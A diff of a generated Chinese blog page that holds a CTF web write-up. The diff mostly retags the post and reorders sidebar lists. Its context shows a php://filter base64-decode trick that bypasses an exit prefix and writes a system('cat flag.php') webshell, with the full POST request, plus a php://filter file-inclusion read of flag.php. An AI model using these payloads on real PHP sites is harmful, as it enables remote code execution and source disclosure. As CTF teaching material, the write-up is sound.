@@ -263,6 +263,8 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "web">web</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "writeup">writeup</a>
+    
 </div>
                 
                 
@@ -421,7 +423,7 @@ height:50vh;
 <p>这里的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$c=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br></pre></td></tr></table></figure></p>
 <p>会使php文件直接退出，不会执行后续代码，所以我们的目的是绕过这句话<br>而p牛提出了一个很好的方法：利用base64加解码的写入<br>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure></p>
 <p>我们来分析一下这句话post上去的流程<br>首先是$c<br>当c拼接后变成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;?&gt;aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=</span><br></pre></td></tr></table></figure></p>
-<p>然后经过base64-decode解码写入<br>这个时候写入后的文件变成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^ƫZ&lt;?php system(&apos;cat flag.php&apos;); ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后经过base64-decode解码写入<br>这个时候写入后的文件变成了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^ƫZ&lt;?php system(&apos;cat flag.php&apos;); ?&gt;</span><br></pre></td></tr></table></figure></p>
 <p>可以看到之前的<code>&lt;?php exit;?&gt;</code>的被解码成未知字符，而php就可以顺利执行后面的代码了<br>注：为什么c之前要加一个a<br>因为在解码的过程中，字符&lt;、?、;、&gt;、空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。<br>而<code>phpexit</code>一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。<br>所以最后发包如下即可获得flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5003</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 110</span><br><span class="line"></span><br><span class="line">c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTsgPz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure></p>
 <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>基础的文件包含题目<br><code>http://119.23.73.3:5001/web8/index.php?file=welcome.txt</code><br>我们访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://119.23.73.3:5001/web8/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure></p>
 <p>即可得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSBoYXZlIGEgZmxhZyEKPD9waHAgCgovL0ZsYWc6IG1vY3Rme2YxbGVfaW5jbHVkNF9lNXN5fQovL0J5OmRhb3l1YW4KCj8+Cg==</span><br></pre></td></tr></table></figure></p>
@@ -601,6 +603,62 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     
     
     
@@ -3893,22 +3951,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CUMTCTF-初赛/" >CUMTCTF-初赛</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/椭圆加密算法ECC/" >椭圆加密算法ECC</a>
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/Bugku-writeup/" >Bugku-writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href= "/2017/06/16/CBC字节翻转攻击/" >CBC字节翻转攻击</a>
         </li>
     
     
@@ -3923,53 +3981,55 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
     
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
         <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
-        <span class="sidebar-tag-name" data-tags="CRC"><span class="iconfont-archer">&#xe606;</span>CRC</span>
-    
-        <span class="sidebar-tag-name" data-tags="CBC"><span class="iconfont-archer">&#xe606;</span>CBC</span>
-    
-        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
+        <span class="sidebar-tag-name" data-tags="aes"><span class="iconfont-archer">&#xe606;</span>aes</span>
     
         <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="hexo"><span class="iconfont-archer">&#xe606;</span>hexo</span>
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="crc32"><span class="iconfont-archer">&#xe606;</span>crc32</span>
+    
+        <span class="sidebar-tag-name" data-tags="rsa"><span class="iconfont-archer">&#xe606;</span>rsa</span>
     
         <span class="sidebar-tag-name" data-tags="serialize"><span class="iconfont-archer">&#xe606;</span>serialize</span>
     
-        <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
-    
-        <span class="sidebar-tag-name" data-tags="php_black_magic"><span class="iconfont-archer">&#xe606;</span>php_black_magic</span>
+        <span class="sidebar-tag-name" data-tags="其他"><span class="iconfont-archer">&#xe606;</span>其他</span>
     
         <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
     
+        <span class="sidebar-tag-name" data-tags="rce"><span class="iconfont-archer">&#xe606;</span>rce</span>
+    
+        <span class="sidebar-tag-name" data-tags="awd"><span class="iconfont-archer">&#xe606;</span>awd</span>
+    
         <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="coding"><span class="iconfont-archer">&#xe606;</span>coding</span>
     
         <span class="sidebar-tag-name" data-tags="cms"><span class="iconfont-archer">&#xe606;</span>cms</span>
     
         <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
     
-        <span class="sidebar-tag-name" data-tags=".git"><span class="iconfont-archer">&#xe606;</span>.git</span>
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
-        <span class="sidebar-tag-name" data-tags="ShadowSocks"><span class="iconfont-archer">&#xe606;</span>ShadowSocks</span>
+        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
     
         <span class="sidebar-tag-name" data-tags="redis"><span class="iconfont-archer">&#xe606;</span>redis</span>
     
         <span class="sidebar-tag-name" data-tags="学业"><span class="iconfont-archer">&#xe606;</span>学业</span>
     
-        <span class="sidebar-tag-name" data-tags="xml"><span class="iconfont-archer">&#xe606;</span>xml</span>
+        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
     
-        <span class="sidebar-tag-name" data-tags=".htaccess"><span class="iconfont-archer">&#xe606;</span>.htaccess</span>
+        <span class="sidebar-tag-name" data-tags="ecc"><span class="iconfont-archer">&#xe606;</span>ecc</span>
     
-        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
-        <span class="sidebar-tag-name" data-tags="ECC"><span class="iconfont-archer">&#xe606;</span>ECC</span>
-    
-        <span class="sidebar-tag-name" data-tags="心情随笔"><span class="iconfont-archer">&#xe606;</span>心情随笔</span>
-    
-        <span class="sidebar-tag-name" data-tags="计网考试"><span class="iconfont-archer">&#xe606;</span>计网考试</span>
+        <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
         <span class="sidebar-tag-name" data-tags="soap"><span class="iconfont-archer">&#xe606;</span>soap</span>
     
@@ -3977,23 +4037,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="writeup.crypto"><span class="iconfont-archer">&#xe606;</span>writeup.crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
     
-        <span class="sidebar-tag-name" data-tags="websummary"><span class="iconfont-archer">&#xe606;</span>websummary</span>
+        <span class="sidebar-tag-name" data-tags="bitcon"><span class="iconfont-archer">&#xe606;</span>bitcon</span>
     
-        <span class="sidebar-tag-name" data-tags="upload"><span class="iconfont-archer">&#xe606;</span>upload</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机实验"><span class="iconfont-archer">&#xe606;</span>微机实验</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机考试"><span class="iconfont-archer">&#xe606;</span>微机考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="马原考试"><span class="iconfont-archer">&#xe606;</span>马原考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="微机实验考试"><span class="iconfont-archer">&#xe606;</span>微机实验考试</span>
-    
-        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
-    
-        <span class="sidebar-tag-name" data-tags="algorithm"><span class="iconfont-archer">&#xe606;</span>algorithm</span>
+        <span class="sidebar-tag-name" data-tags="des"><span class="iconfont-archer">&#xe606;</span>des</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -4048,9 +4096,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="awd"><span class="iconfont-archer">&#xe60a;</span>awd</span>
     
-        <span class="sidebar-category-name" data-categories="心情随笔"><span class="iconfont-archer">&#xe60a;</span>心情随笔</span>
-    
         <span class="sidebar-category-name" data-categories="计网考试"><span class="iconfont-archer">&#xe60a;</span>计网考试</span>
+    
+        <span class="sidebar-category-name" data-categories="心情随笔"><span class="iconfont-archer">&#xe60a;</span>心情随笔</span>
     
         <span class="sidebar-category-name" data-categories="flask"><span class="iconfont-archer">&#xe60a;</span>flask</span>
     
